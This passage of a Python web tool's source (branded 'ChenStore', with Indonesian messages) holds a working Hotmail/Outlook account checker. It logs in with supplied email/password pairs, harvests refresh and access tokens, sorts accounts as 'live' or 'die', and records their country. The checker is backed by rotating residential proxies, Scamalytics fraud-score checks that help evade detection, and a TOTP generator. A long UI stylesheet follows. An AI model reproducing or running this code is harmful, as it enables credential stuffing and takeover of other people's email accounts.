        l1 = r1.headers.get("Location", "")
        t1 = re.search(r'refresh_token=([^&\s#]+)', unquote(l1))
        if t1:
            return {"refresh_token": t1.group(1), "status": "live", "bytes": bytes_count}

        src = r1.text
        if "privacynotice" in src:
            p_u = _hm_g_s(src, 'action="', '"').replace("&amp;", "&")
            p_c = _hm_g_s(src, 'name="code" id="code" value="', '"')
            p_i = _hm_g_s(src, 'name="correlation_id" id="correlation_id" value="', '"')
            if p_u and p_c:
                rp = s.post(p_u, data={"correlation_id": p_i, "code": p_c}, headers=headers, timeout=timeout, proxies=prox)
                if prox: bytes_count += len(rp.content) + 500
        if "incorrect" in src or "Wrong password" in src or "doesn't exist" in src or "isn't correct" in src or "wrong_password" in src:
            return {"error": "Incorrect password / Email does not exist", "status": "die", "bytes": bytes_count}
        
        f2 = _hm_e_p(src)
        u2 = _hm_e_u(src)
        if f2 and u2:
            r2 = s.post(u2, data={"login": u, "passwd": p, "PPFT": f2, "ps": "2"}, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
            if prox: bytes_count += len(r2.content) + 500
            l2 = r2.headers.get("Location", "")
            t2 = re.search(r'refresh_token=([^&\s#]+)', unquote(l2))
            if t2:
                return {"refresh_token": t2.group(1), "status": "live", "bytes": bytes_count}

        a = {"client_id": "0000000048170EF2", "redirect_uri": "https://login.live.com/oauth20_desktop.srf", "response_type": "token", "scope": "service::outlook.office.com::MBI_SSL"}
        ra = s.get("https://login.live.com/oauth20_authorize.srf", params=a, headers=headers, timeout=timeout, allow_redirects=False, proxies=prox)
        if prox: bytes_count += len(ra.content) + 500
        l = ra.headers.get("Location", "")
        t = re.search(r'refresh_token=([^&\s#]+)', unquote(l))
        if t:
            return {"refresh_token": t.group(1), "status": "live", "bytes": bytes_count}
        
        all_text = f"{l1} {l} {ra.text} {r1.text}"
        t_fallback = re.search(r'refresh_token=([^&\s#"\']+)', unquote(all_text))
        if t_fallback:
            return {"refresh_token": t_fallback.group(1), "status": "live", "bytes": bytes_count}

        if "ANON" in s.cookies or "RPSTAuth" in s.cookies or "MSPOK" in s.cookies or "MSPAuth" in s.cookies:
            return {"status": "live", "info": "L|S_T", "bytes": bytes_count}
        return {"error": "Login failed / Security checkpoint", "status": "die", "bytes": bytes_count}
    except Exception as e:
        err_msg = str(e)
        if "SSLError" in err_msg or "handshake" in err_msg.lower():
            return {"error": "Rate limit / SSL blocked by Microsoft (Gunakan Proxy)", "status": "die", "bytes": bytes_count}
        return {"error": err_msg[:60], "status": "die", "bytes": bytes_count}

def _hm_g_a(s, r, proxy_url=None, timeout=15):
    try:
        prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        y = f"grant_type=refresh_token&client_id=0000000048170EF2&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite&refresh_token={r}"
        res = s.post("https://login.live.com/oauth20_token.srf", data=y, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout, proxies=prox)
        b = (len(res.content) + 500) if prox else 0
        return res.json().get("access_token", ""), b
    except Exception:
        return "", 0

def _hm_get_country(s, at, cid, proxy_url=None, timeout=10):
    b = 0
    prox = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    headers = {"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}", "Accept": "application/json"}
    try:
        res = s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=timeout, proxies=prox)
        if prox: b += len(res.content) + 500
        if res.status_code == 200:
            r = res.json()
            l = r.get("accounts", [{}])[0].get("location", "") or r.get("preferences", {}).get("location", "")
            if l:
                return l, b
    except Exception:
        pass
    try:
        res = s.get("https://outlook.live.com/owa/?nlp=1&offline=1", headers=headers, timeout=timeout, proxies=prox)
        if prox: b += len(res.content) + 500
        m = re.search(r'"Country":"([A-Z]{2})"', res.text)
        if m:
            return m.group(1), b
    except Exception:
        pass
    return "UN", b

def check_single_hotmail(email: str, password: str, proxy_url: Optional[str] = None, timeout: int = 15) -> Dict[str, Any]:
    email = (email or "").strip()
    password = (password or "").strip()
    if not email or not password:
        return {"ok": False, "live": False, "email": email, "password": password, "status": "die", "country": "UN", "country_name": "Unknown", "motivo": "Missing email/password", "bytes_used": 0}
    try:
        resolved_proxy = None
        if proxy_url and str(proxy_url).strip():
            raw_p = str(proxy_url).strip()
            sid = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
            if "{sess}" in raw_p:
                raw_p = raw_p.replace("{sess}", sid)
            elif "dataimpulse.com" in raw_p and "sessid." not in raw_p:
                if "@" in raw_p:
                    auth_part, host_part = raw_p.split("@", 1)
                    if ":" in auth_part:
                        u, pw = auth_part.rsplit(":", 1)
                        raw_p = f"{u}__sessid.{sid}:{pw}@{host_part}"
            try:
                resolved_proxy = parse_proxy_spec(raw_p).url
            except Exception:
                resolved_proxy = raw_p
                if "://" not in resolved_proxy:
                    resolved_proxy = f"http://{resolved_proxy}"
        s = requests.Session()
        r = _hm_l_h(s, email, password, resolved_proxy, timeout=timeout)
        total_bytes = r.get("bytes", 0)
        if r.get("status") == "live":
            ct = "UN"
            t = r.get("refresh_token")
            cid = s.cookies.get("MSPCID", "").upper()
            result_msg = "Login OK"
            if t and cid:
                at, b1 = _hm_g_a(s, t, resolved_proxy, timeout=timeout)
                total_bytes += b1
                if at:
                    ct, b2 = _hm_get_country(s, at, cid, resolved_proxy, timeout=timeout)
                    total_bytes += b2
                    if ct and ct != "UN":
                        result_msg = f"Login OK | 🌍 Negara: {country_name(ct)} ({ct})"
                    else:
                        result_msg = "Login OK | 🌍 Negara: N/A"
            return {
                "ok": True,
                "live": True,
                "email": email,
                "password": password,
                "status": "live",
                "country": ct,
                "country_name": country_name(ct),
                "motivo": result_msg,
                "refresh_token": t or "",
                "bytes_used": total_bytes
            }
        else:
            return {
                "ok": True,
                "live": False,
                "email": email,
                "password": password,
                "status": "die",
                "country": "UN",
                "country_name": "Unknown",
                "motivo": r.get("error", "Login failed"),
                "bytes_used": total_bytes
            }
    except Exception as e:
        return {
            "ok": True,
            "live": False,
            "email": email,
            "password": password,
            "status": "die",
            "country": "UN",
            "country_name": "Unknown",
            "motivo": str(e)[:60],
            "bytes_used": 0
        }


# ==================== 2FA TOTP & PROXY CHECKER CORE LOGIC ====================

def generate_totp_code(secret: str, digits: int = 6, interval: int = 30) -> str:
    """Generate 6-digit TOTP code locally compliant with RFC 6238 / Google Authenticator."""
    if not secret:
        return ""
    clean_secret = re.sub(r"[\s\-]+", "", str(secret)).upper()
    try:
        pad_len = (8 - (len(clean_secret) % 8)) % 8
        padded = clean_secret + ("=" * pad_len)
        key = base64.b32decode(padded, casefold=True)
        now = int(time.time())
        counter = struct.pack(">Q", now // interval)
        h = hmac.new(key, counter, hashlib.sha1).digest()
        offset = h[-1] & 0x0F
        code_int = struct.unpack(">I", h[offset:offset + 4])[0] & 0x7FFFFFFF
        return str(code_int % (10 ** digits)).zfill(digits)
    except Exception:
        return ""


class ProxySpec:
    def __init__(self, scheme: str, host: str, port: int, username: str = "", password: str = ""):
        self.scheme = (scheme or "http").lower()
        self.host = host
        self.port = int(port)
        self.username = username
        self.password = password

    @property
    def url(self) -> str:
        auth = ""
        if self.username or self.password:
            u = quote(self.username, safe="")
            p = quote(self.password, safe="")
            auth = f"{u}:{p}@"
        host = f"[{self.host}]" if ":" in self.host and not self.host.startswith("[") else self.host
        return f"{self.scheme}://{auth}{host}:{self.port}"

    @property
    def display(self) -> str:
        if self.username:
            return f"{self.host}:{self.port}:{self.username}:***"
        return f"{self.host}:{self.port}"

    @property
    def raw_format(self) -> str:
        if self.username or self.password:
            return f"{self.host}:{self.port}:{self.username}:{self.password}"
        return f"{self.host}:{self.port}"


def parse_proxy_spec(raw: str, default_scheme: str = "http") -> ProxySpec:
    """Parse proxy line in any format (HOST:PORT:USER:PASS, USER:PASS:HOST:PORT, URL)."""
    raw = (raw or "").strip()
    if not raw:
        raise ValueError("Baris proxy kosong")

    if "://" in raw:
        p = urlsplit(raw)
        scheme = p.scheme.lower() or default_scheme
        port = p.port or (443 if scheme == "https" else 80)
        return ProxySpec(scheme, p.hostname or "", port, unquote(p.username or ""), unquote(p.password or ""))

    if "@" in raw:
        left, right = raw.split("@", 1)
        if ":" in left and left.split(":")[-1].isdigit():
            # host:port@user:pass
            host, port = left.rsplit(":", 1)
            u, pw = right.split(":", 1) if ":" in right else (right, "")
            return ProxySpec(default_scheme, host, int(port), u, pw)
        else:
            # user:pass@host:port
            u, pw = left.split(":", 1) if ":" in left else (left, "")
            host, port = right.rsplit(":", 1)
            return ProxySpec(default_scheme, host, int(port), u, pw)

    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return ProxySpec(default_scheme, parts[0], int(parts[1]))
    elif len(parts) >= 4:
        if parts[1].isdigit():
            # host:port:user:pass (pass may contain colons)
            return ProxySpec(default_scheme, parts[0], int(parts[1]), parts[2], ":".join(parts[3:]))
        elif parts[-1].isdigit():
            # user:pass:host:port (pass may contain colons)
            return ProxySpec(default_scheme, parts[-2], int(parts[-1]), parts[0], ":".join(parts[1:-2]))

    raise ValueError(f"Format proxy tidak didukung: {raw}")


class ScamalyticsTableParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.rows = []
        self._row = None
        self._cell = None

    def handle_starttag(self, tag, attrs):
        tag = tag.lower()
        if tag == "tr":
            self._row = []
        elif tag in {"th", "td"} and self._row is not None:
            attributes = dict(attrs)
            self._cell = {"tag": tag, "classes": set((attributes.get("class") or "").split()), "text": []}
        elif tag == "br" and self._cell is not None:
            self._cell["text"].append(" ")

    def handle_data(self, data):
        if self._cell is not None:
            self._cell["text"].append(data)

    def handle_endtag(self, tag):
        tag = tag.lower()
        if tag in {"th", "td"} and self._cell is not None:
            self._cell["value"] = " ".join("".join(self._cell["text"]).split())
            if self._row is not None:
                self._row.append(self._cell)
            self._cell = None
        elif tag == "tr" and self._row is not None:
            self.rows.append(self._row)
            self._row = None


_SCAMALYTICS_CACHE: Dict[str, Tuple[float, Dict[str, Any]]] = {}
_SCAMALYTICS_CACHE_TTL = 3600 * 12  # 12 hours


def scrape_scamalytics(ip: str, timeout: float = 8.0) -> Dict[str, Any]:
    """Scrape Scamalytics for Fraud Score, Risk Level & Network details with cache."""
    now = time.time()
    if ip in _SCAMALYTICS_CACHE:
        ts, cached = _SCAMALYTICS_CACHE[ip]
        if now - ts < _SCAMALYTICS_CACHE_TTL:
            return cached

    url = f"https://scamalytics.com/ip/{quote(ip, safe='')}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml"
    }
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        if r.status_code == 200:
            html = r.text
            parser = ScamalyticsTableParser()
            parser.feed(html)
            fields = {}
            for row in parser.rows:
                if len(row) >= 2:
                    lbl = re.sub(r"[^a-z0-9]+", "_", row[0]["value"].lower()).strip("_")
                    val = row[1]["value"]
                    if lbl:
                        fields[lbl] = val

            fraud_score_match = re.search(r"Fraud\s+Score\s*:\s*(\d+)", html, re.IGNORECASE)
            fraud_risk_match = re.search(r"<div[^>]*class=[\"'][^\"']*panel_title[^\"']*[\"'][^>]*>(.*?)</div>", html, re.IGNORECASE | re.DOTALL)
            fraud_risk = ""
            if fraud_risk_match:
                fraud_risk = re.sub(r"<[^>]+>", " ", fraud_risk_match.group(1)).strip()

            blacklist_names = {"firehol", "ip2proxylite", "ipsum", "spamhaus", "x4bnet_spambot"}
            blacklist_hits = [k for k in blacklist_names if fields.get(k, "").lower() == "yes"]

            res = {
                "ok": True,
                "ip": ip,
                "url": url,
                "fraud_score": int(fraud_score_match.group(1)) if fraud_score_match else None,
                "fraud_risk": fraud_risk or fields.get("risk", "Unknown"),
                "residential_proxy": fields.get("residential_proxy", "no"),
                "datacenter": fields.get("datacenter", "no"),
                "last_proxy_provider": fields.get("last_proxy_provider", ""),
                "blacklist_hits": blacklist_hits
            }
            _SCAMALYTICS_CACHE[ip] = (now, res)
            return res
        else:
            return {"ok": False, "ip": ip, "error": f"Scamalytics HTTP {r.status_code}"}
    except Exception as e:
        return {"ok": False, "ip": ip, "error": str(e)[:100]}


def check_single_proxy_connectivity(proxy_input: Any, timeout: float = 15.0, check_scamalytics: bool = False) -> Dict[str, Any]:
    """Test connectivity, measure latency, resolve exit IP and geolocation for a proxy."""
    if isinstance(proxy_input, str):
        try:
            spec = parse_proxy_spec(proxy_input)
        except Exception as e:
            return {
                "ok": True,
                "live": False,
                "error": f"Format error: {str(e)}",
                "display": proxy_input,
                "raw": proxy_input,
                "latency_ms": 0
            }
    else:
        spec = proxy_input

    proxies = {"http": spec.url, "https": spec.url}
    headers = {"User-Agent": UA, "Cache-Control": "no-cache"}

    t0 = time.time()
    # Primary lookup via ip-api.com
    try:
        r = requests.get("http://ip-api.com/json", proxies=proxies, headers=headers, timeout=timeout)
        latency = round((time.time() - t0) * 1000)
        if r.status_code == 200:
            data = r.json()
            exit_ip = data.get("query", "")
            result = {
                "ok": True,
                "live": True,
                "latency_ms": latency,
                "exit_ip": exit_ip,
                "country": data.get("country", ""),
                "country_code": data.get("countryCode", ""),
                "city": data.get("city", ""),
                "region": data.get("regionName", ""),
                "isp": data.get("isp", ""),
                "org": data.get("org", ""),
                "as": data.get("as", ""),
                "display": spec.display,
                "raw": spec.raw_format,
                "scheme": spec.scheme,
                "host": spec.host,
                "port": spec.port,
                "fraud_score": None,
                "fraud_risk": "",
                "residential": "",
                "datacenter": ""
            }

            if check_scamalytics and exit_ip:
                scam = scrape_scamalytics(exit_ip, timeout=timeout)
                if scam.get("ok"):
                    result["fraud_score"] = scam.get("fraud_score")
                    result["fraud_risk"] = scam.get("fraud_risk")
                    result["residential"] = scam.get("residential_proxy")
                    result["datacenter"] = scam.get("datacenter")
                    result["last_proxy_provider"] = scam.get("last_proxy_provider")
                    result["blacklist_hits"] = scam.get("blacklist_hits", [])

            return result
    except Exception as e:
        # Fallback to ipify if ip-api blocked
        try:
            t0 = time.time()
            r2 = requests.get("https://api.ipify.org?format=json", proxies=proxies, headers=headers, timeout=timeout)
            latency = round((time.time() - t0) * 1000)
            if r2.status_code == 200:
                ip_data = r2.json()
                exit_ip = ip_data.get("ip", "")
                result = {
                    "ok": True,
                    "live": True,
                    "latency_ms": latency,
                    "exit_ip": exit_ip,
                    "country": "-",
                    "country_code": "",
                    "city": "-",
                    "region": "-",
                    "isp": "-",
                    "org": "-",
                    "as": "-",
                    "display": spec.display,
                    "raw": spec.raw_format,
                    "scheme": spec.scheme,
                    "host": spec.host,
                    "port": spec.port,
                    "fraud_score": None,
                    "fraud_risk": ""
                }
                if check_scamalytics and exit_ip:
                    scam = scrape_scamalytics(exit_ip, timeout=timeout)
                    if scam.get("ok"):
                        result["fraud_score"] = scam.get("fraud_score")
                        result["fraud_risk"] = scam.get("fraud_risk")
                return result
        except Exception:
            pass

        err_msg = str(e)
        if "ProxyError" in err_msg or "Cannot connect to proxy" in err_msg:
            err_msg = "Proxy Unreachable / Connection Refused"
        elif "Timeout" in err_msg or "timed out" in err_msg:
            err_msg = f"Connection Timed Out ({timeout}s)"
        elif "407" in err_msg or "Authentication Required" in err_msg:
            err_msg = "Auth Failed (Invalid User/Pass)"
        elif "403" in err_msg:
            err_msg = "Proxy Forbidden (403)"

        return {
            "ok": True,
            "live": False,
            "latency_ms": 0,
            "error": err_msg[:120],
            "display": spec.display,
            "raw": spec.raw_format,
            "scheme": spec.scheme,
            "host": spec.host,
            "port": spec.port
        }


def parse_proxy_lines(text: str) -> List[Dict[str, Any]]:
    """Parse multiline proxy string into list of valid proxy spec objects."""
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            spec = parse_proxy_spec(line)
            key = (spec.scheme, spec.host.lower(), spec.port, spec.username, spec.password)
            if key not in seen:
                seen.add(key)
                results.append({
                    "raw": spec.raw_format,
                    "display": spec.display,
                    "scheme": spec.scheme,
                    "host": spec.host,
                    "port": spec.port,
                    "username": spec.username,
                    "password": spec.password
                })
        except Exception:
            continue
    return results


# ==================== HTML TEMPLATE ====================
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChenStore | MULTI TOOLS</title>
  <link rel="icon" type="image/png" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="shortcut icon" type="image/png" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="apple-touch-icon" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="icon" type="image/png" href="/logo.png">
  <link rel="manifest" href="/manifest.json">
  <meta name="theme-color" content="#0f0a06">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap');

    :root {
      --bg-wood-dark: #0f0a06;
      --bg-card: #18110b;
      --bg-card-secondary: #221810;
      --border-bronze: #452e1d;
      --border-gold: #b45309;
      --gold-main: #f59e0b;
      --gold-light: #fef08a;
      --gold-glow: rgba(245, 158, 11, 0.35);
      --text-main: #fef3c7;
      --text-muted: #a89f91;
      --dot-green: #22c55e;
      --dot-red: #ef4444;
    }

    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      overflow: hidden; /* Lock the outer viewport completely */
    }

    body {
      background-color: var(--bg-wood-dark);
      background-image: 
        radial-gradient(circle at 15% 15%, rgba(180, 83, 9, 0.12) 0%, transparent 40%),
        radial-gradient(circle at 85% 85%, rgba(217, 119, 6, 0.08) 0%, transparent 45%);
      color: var(--text-main);
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Top Navbar */
    .top-navbar {
      background: linear-gradient(180deg, #1d1209 0%, #140c06 100%);
      border-bottom: 1px solid var(--border-bronze);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
      padding: 0.55rem 1.25rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      position: sticky;
      top: 0;
      z-index: 1000;
      flex-shrink: 0;
    }

    .brand-container {
      display: flex;
      align-items: center;
      gap: 0.65rem;
      min-width: 0;
    }

    .brand-logo-img {
      height: 38px;
      width: 38px;
      object-fit: cover;
      border-radius: 8px;
      border: 1px solid #78471c;
      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
      flex-shrink: 0;
    }

    .brand-title {
      font-family: 'Cinzel', serif;
      font-weight: 800;
      font-size: 1.35rem;
      letter-spacing: 1.2px;
      background: linear-gradient(135deg, #fffbeb 0%, #fef08a 25%, #f59e0b 60%, #b45309 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 10px rgba(245, 158, 11, 0.3);
      line-height: 1.1;
      white-space: nowrap;
    }

    .brand-sub {
      font-size: 0.62rem;
      letter-spacing: 1.5px;
      color: var(--gold-main);
      font-weight: 700;
      opacity: 0.9;
      white-space: nowrap;
    }

    .navbar-right {
      display: flex;
      align-items: center;
      gap: 0.65rem;
      min-width: 0;
    }

    .navbar-tabs-container {
      display: flex;
      align-items: center;
      min-width: 0;
    }

    .nav-tabs-custom {
      display: flex;
      gap: 0.3rem;
      background-color: #0b0704;
      padding: 0.25rem;
      border-radius: 10px;
      border: 1px solid var(--border-bronze);
      overflow-x: auto;
      max-width: 100%;
      scrollbar-width: none;
      -webkit-overflow-scrolling: touch;
    }
    .nav-tabs-custom::-webkit-scrollbar {
      display: none;
    }

    .nav-tab-btn {
      background: transparent;
      border: 1px solid transparent;
      color: #d1c7bd;
      font-weight: 600;
      font-size: 0.82rem;
      padding: 0.4rem 0.85rem;
      border-radius: 7px;
      transition: all 0.15s ease;
      cursor: pointer;
      display: flex;
      align-items: center;
      white-space: nowrap;
      flex-shrink: 0;
      user-select: none;
    }

    .nav-tab-btn:hover {
      color: var(--gold-light);
      background-color: rgba(245, 158, 11, 0.1);
    }

    .nav-tab-btn.active {
      background: linear-gradient(135deg, #2b1a0e 0%, #1f1208 100%);
      color: var(--gold-light);
      border-color: var(--border-gold);
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5), inset 0 0 8px rgba(245, 158, 11, 0.2);
    }

    .main-tab-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      position: relative;
      min-height: 0;
      height: calc(100vh - 60px);
      overflow: hidden;
    }

    .tab-pane-custom {
      display: none;
      flex: 1;
      width: 100%;
      height: 100%;
      min-height: 0;
      overflow: hidden;
    }

    .tab-pane-custom.active {
      display: flex;
      flex-direction: column;
      height: 100%;
      min-height: 0;
    }

    /* Container for CapCut, 2FA, Proxy */
    .capcut-container {
      flex: 1;
      min-height: 0;
      height: 100%;
      padding: 1.25rem;
      overflow-y: auto;
      max-width: 1320px;
      margin: 0 auto;
      width: 100%;
    }

    .card-theme {
      background-color: var(--bg-card);
      border: 1px solid var(--border-bronze);
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
    }

    .form-control-theme {
      background-color: #0d0805 !important;
      border: 1px solid var(--border-bronze) !important;
      color: var(--text-main) !important;
      border-radius: 8px !important;
      font-size: 0.88rem !important;
    }

    .form-control-theme:focus {
      border-color: var(--gold-main) !important;
      box-shadow: 0 0 0 3px var(--gold-glow) !important;
    }

    .btn-gold {
      background: linear-gradient(135deg, #d97706 0%, #b45309 100%);
      color: #fff;
      font-weight: 600;
      border: 1px solid #f59e0b;
      box-shadow: 0 2px 10px rgba(180, 83, 9, 0.3);
      transition: all 0.2s ease;
      border-radius: 8px;
    }

    .btn-gold:hover {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #fff;
      box-shadow: 0 4px 15px var(--gold-glow);
    }

    .btn-outline-gold {
      border: 1px solid var(--gold-main);
      color: var(--gold-main);
      background: transparent;
      border-radius: 8px;
      transition: all 0.15s ease;
    }

    .btn-outline-gold:hover, .btn-outline-gold:active {
      background-color: var(--gold-main);
      color: #180d05;
    }

    /* Trackmail 3-Column Layout */
    .trackmail-container {
      flex: 1;
      display: flex;
      height: 100%;
      max-height: 100%;
      background-color: var(--bg-wood-dark);
      overflow: hidden;
      min-height: 0;
    }

    .tm-sidebar {
      width: 290px;
      min-width: 260px;
      background-color: var(--bg-card);
      border-right: 1px solid var(--border-bronze);
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      height: 100%;
      max-height: 100%;
      overflow: hidden;
      min-height: 0;
    }

    .tm-messages-col {
      width: 330px;
      min-width: 280px;
      background-color: var(--bg-card-secondary);
      border-right: 1px solid var(--border-bronze);
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      height: 100%;
      max-height: 100%;
      overflow: hidden;
      min-height: 0;
    }

    .tm-reader-col {
      flex: 1;
      background-color: var(--bg-wood-dark);
      display: flex;
      flex-direction: column;
      overflow: hidden;
      min-width: 0;
      height: 100%;
      max-height: 100%;
      min-height: 0;
    }

    .tm-sidebar-header, .tm-messages-header, .tm-reader-topbar {
      flex-shrink: 0;
      padding: 0.65rem 0.9rem;
      background: #140c06;
      border-bottom: 1px solid var(--border-bronze);
      display: flex;
      align-items: center;
      justify-content: space-between;
      min-height: 48px;
    }

    .tm-accounts-list, .tm-messages-list {
      flex: 1;
      min-height: 0;
      overflow-y: auto;
      overflow-x: hidden;
      padding: 0.4rem;
    }

    .tm-account-item {
      display: flex !important;
      align-items: center !important;
      gap: 0.65rem;
      padding: 0.4rem 0.65rem;
      border-radius: 8px;
      margin-bottom: 0.25rem;
      border: 1px solid transparent;
      cursor: pointer;
      transition: all 0.15s ease;
      background-color: rgba(255, 255, 255, 0.02);
      min-height: 44px;
    }

    .tm-account-item:hover {
      background-color: rgba(245, 158, 11, 0.08);
      border-color: rgba(180, 83, 9, 0.3);
    }

    .tm-account-item.active {
      background-color: rgba(245, 158, 11, 0.15);
      border-color: var(--gold-main);
      box-shadow: inset 0 0 10px rgba(245, 158, 11, 0.1);
    }

    .tm-avatar {
      width: 30px;
      height: 30px;
      min-width: 30px;
      border-radius: 50%;
      background: linear-gradient(135deg, #b45309 0%, #78350f 100%);
      color: #fef08a;
      font-weight: 700;
      font-size: 0.8rem;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
      flex-shrink: 0;
    }

    .status-dot {
      width: 7px;
      height: 7px;
      min-width: 7px;
      border-radius: 50%;
      display: inline-block;
      flex-shrink: 0;
    }

    .status-dot.live {
      background-color: var(--dot-green);
      box-shadow: 0 0 6px rgba(34, 197, 94, 0.8);
    }

    .status-dot.dead {
      background-color: var(--dot-red);
      box-shadow: 0 0 6px rgba(239, 68, 68, 0.8);
    }

    .tm-message-item {
      display: block;
      padding: 0.4rem 0.65rem;
      border-radius: 8px;
      margin-bottom: 0.25rem;
      border: 1px solid transparent;
      cursor: pointer;
      transition: all 0.15s ease;
      background-color: rgba(255, 255, 255, 0.02);
    }

    .tm-message-item:hover {
      background-color: rgba(245, 158, 11, 0.08);
      border-color: rgba(180, 83, 9, 0.3);
    }

    .tm-message-item.active {
      background-color: rgba(245, 158, 11, 0.15);
      border-color: var(--gold-main);
      box-shadow: inset 0 0 10px rgba(245, 158, 11, 0.1);
    }

    .tm-unread-dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background-color: var(--gold-main);
      display: inline-block;
      margin-right: 4px;
      vertical-align: middle;
      box-shadow: 0 0 6px var(--gold-glow);
    }

    .tm-account-item:hover, .tm-message-item:hover {
      background-color: rgba(245, 158, 11, 0.08);
      border-color: rgba(180, 83, 9, 0.3);
    }

    .tm-account-item.active, .tm-message-item.active {
      background-color: rgba(245, 158, 11, 0.15);
      border-color: var(--gold-main);
      box-shadow: inset 0 0 10px rgba(245, 158, 11, 0.1);
    }

    .tm-reader-content {
      flex: 1;
      min-height: 0;
      padding: 1.25rem;
      overflow-y: auto;
      overflow-x: hidden;
    }

    .tm-meta-card {
      background: #140c06;
      border: 1px solid var(--border-bronze);
      border-radius: 10px;
      padding: 0.85rem 1.15rem;
      margin-bottom: 1rem;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
    }

    .tm-email-iframe-container {
      flex: 1;
      width: 100%;
      min-height: 580px;
      display: flex;
      flex-direction: column;
      border-radius: 10px;
      overflow: hidden;
      border: 1px solid var(--border-bronze);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
      background-color: #ffffff;
    }

    .tm-email-iframe {
      width: 100%;
      height: 100%;
      min-height: 580px;
      flex: 1;
      border: none;
      background-color: #ffffff;
      display: block;
    }
    
    
    /* Platform Filter Chips */
    .tm-platform-chips {
      display: flex;
      gap: 4px;
      overflow-x: auto;
      scrollbar-width: none;
      -webkit-overflow-scrolling: touch;
      padding: 2px 0 3px 0;
      white-space: nowrap;
      flex-wrap: nowrap;
    }
    .tm-platform-chips::-webkit-scrollbar {
      display: none;
    }
    .tm-chip-btn {
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(120, 71, 28, 0.6);
      color: #d1c7bd;
      font-size: 0.73rem;
      font-weight: 600;
      padding: 3px 9px;
      border-radius: 20px;
      cursor: pointer;
      transition: all 0.15s ease;
      display: inline-flex;
      align-items: center;
      white-space: nowrap;
      flex-shrink: 0;
      user-select: none;
      line-height: 1.2;
    }
    .tm-chip-btn:hover {
      color: var(--gold-light);
      background: rgba(245, 158, 11, 0.15);
      border-color: var(--gold-main);
    }
    .tm-chip-btn.active {
      background: linear-gradient(135deg, #b45309 0%, #78350f 100%);
      color: #ffffff;
      font-weight: 700;
      border-color: var(--gold-main);
      box-shadow: 0 2px 8px rgba(245, 158, 11, 0.3);
    }
    
    
    /* Mobile Tab Dropdown */
    .mobile-tab-dropdown {
      position: relative;
      display: none;
      flex-shrink: 0;
    }

    .mobile-tab-menu {
      display: none;
      position: absolute;
      top: calc(100% + 6px);
      right: 0;
      background: #18110b;
      border: 1px solid #78471c;
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.85);
      min-width: 195px;
      z-index: 99999;
      padding: 6px 0;
      margin: 0;
      list-style: none;
    }

    .mobile-tab-menu.show {
      display: block !important;
    }

    .mobile-tab-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 9px 14px;
      color: #fef08a;
      text-decoration: none;
      font-size: 0.84rem;
      font-weight: 500;
      cursor: pointer;
      user-select: none;
      transition: background 0.15s ease, color 0.15s ease;
    }

    .mobile-tab-item:hover, .mobile-tab-item:active {
      background: rgba(217, 119, 6, 0.25);
      color: #ffffff;
    }

    .mobile-tab-item.active {
      background: rgba(217, 119, 6, 0.4);
      color: #fbbf24;
      font-weight: 700;
    }
    
    
    /* Custom Gold/Bronze Luxury Scrollbar */
    ::-webkit-scrollbar {
      width: 6px;
      height: 6px;
    }
    ::-webkit-scrollbar-track {
      background: rgba(15, 10, 6, 0.6);
    }
    ::-webkit-scrollbar-thumb {
      background: #4a2c16;
      border-radius: 10px;
      border: 1px solid #78471c;
      transition: background 0.2s ease;
    }
    ::-webkit-scrollbar-thumb:hover {
      background: var(--gold-main);
      box-shadow: 0 0 8px var(--gold-glow);
    }

    /* Glassmorphism Navbar & Modals */
    .top-navbar {
